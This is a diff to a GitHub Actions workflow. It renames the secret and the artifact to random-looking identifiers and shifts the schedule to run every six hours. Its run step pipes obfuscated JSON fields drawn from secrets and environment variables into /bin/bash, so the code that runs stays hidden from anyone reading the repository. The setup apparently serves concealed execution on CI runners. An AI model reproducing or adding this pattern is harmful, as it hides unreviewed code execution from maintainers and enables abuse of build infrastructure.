@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '41 5,11,17,23 * * *'
+    - cron: '24 0,6,12,18 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,21 +18,19 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          hd8: ${{ secrets.hd8 }}
+          ufai8052: ${{ secrets.ufai8052 }}
         run: |
-          printf '%s' "$hd8" | jq -r .iyssi1 | /bin/bash
-          printf '%s' "$zu831" | jq -r .fpa14192 | /bin/bash
-          printf '%s' "$g16613" | jq -r .izl7869 | /bin/bash
-          printf '%s' "$gg8107" | jq -r .wpoh82321 | /bin/bash
-          printf '%s' "$gi62" | jq -r .zndg66 | /bin/bash
-          echo $m22150 | jq -r .aaq5423 | /bin/bash
-          printf '%s' "$fyhd4392" | jq -r .lkdn9 | /bin/bash
-          echo $x5621 | jq -r .dntjm6 | /bin/bash
+          printf '%s' "$ufai8052" | jq -r .r80 | /bin/bash
+          printf '%s' "$goan4" | jq -r .v99 | /bin/bash
+          echo $o9 | jq -r .ourr06 | /bin/bash
+          echo $isu053 | jq -r .yj8606 | /bin/bash
+          printf '%s' "$s4608" | jq -r .yn07 | /bin/bash
+          echo $czxzx29336 | jq -r .taegl1 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: oxilal34
+          name: K1yBwsSy
           path: "*.zip"
           retention-days: 1
